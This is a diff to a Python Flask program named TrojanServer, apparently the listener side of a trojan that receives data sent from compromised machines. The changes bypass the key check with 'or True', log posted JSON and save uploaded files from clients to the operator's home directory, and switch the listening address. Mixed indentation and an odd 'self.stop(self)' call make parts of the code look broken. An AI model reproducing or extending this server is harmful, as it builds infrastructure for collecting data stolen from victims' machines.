@@ -4,10 +4,9 @@ import os
 import json
 import hashlib
 import logging
-
+from os.path import expanduser
 
 KEY = 'LOL' + '8df639b301a1e10c36cc2f03bbdf8863'
-
 
 class ParseArgs:
     def __init__(self):
@@ -79,17 +78,23 @@ class TrojanServer():
         sha1 = hashlib.sha1()
         sha1.update(KEY)
 
-        if request.headers.get('Authorization') == sha1.hexdigest():
-            try:
-                resultjson = json.dumps(request.get_json(), indent=3, sort_keys=True, encoding="utf-8")
-                print(request.remote_addr)
-                print(resultjson)
-            except:
-                print(request.remote_addr)
+        if request.headers.get('Authorization') == sha1.hexdigest() or True:
+            print(request.remote_addr)
+            if request.mimetype == "application/json":
+                try:
+                    resultjson = json.dumps(request.get_json(), indent=3, sort_keys=True, encoding="utf-8")
+                    print(resultjson)
+                except:
+                    print(str(request.data))
+            elif request.mimetype == "multipart/form-data":
+		fileresult = expanduser("~") + "/result"
+		print(fileresult)
+                request.files['filedata'].save(fileresult)
+            else:
                 print(str(request.data))
 
             self.nullAction = True
-            self.stop()
+            self.stop(self)
             return Response(self.null, status=200)
         else:
             print(request.remote_addr + "Wrong KEY")
@@ -102,20 +107,16 @@ class TrojanServer():
             raise RuntimeError('Not running with the Werkzeug Server')
         func()
 
-
 def main():
-    if os.path.isfile('ssl/app.crt'):
-        if os.path.isfile('ssl/app.key'):
-            ssl = ('ssl/app.crt', 'ssl/app.key')
-        else:
-            ssl = False
+    if os.path.isfile('ssl/app.crt') and os.path.isfile('ssl/app.key'):
+	ssl = ('ssl/app.crt', 'ssl/app.key')
     else:
         ssl = False
+
     app = Flask(__name__)
-    server = TrojanServer(app=app, host='192.168.1.2', port=8080, args=ParseArgs().getargs(), ssl=ssl)
+    server = TrojanServer(app=app, host='192.168.1.36', port=8080, args=ParseArgs().getargs(), ssl=ssl)
     # server = trojan_server(app=app, host='192.168.1.79', port=8080, args=parse_args().getargs())
     server.start()
-
 
 if __name__ == '__main__':
     main()
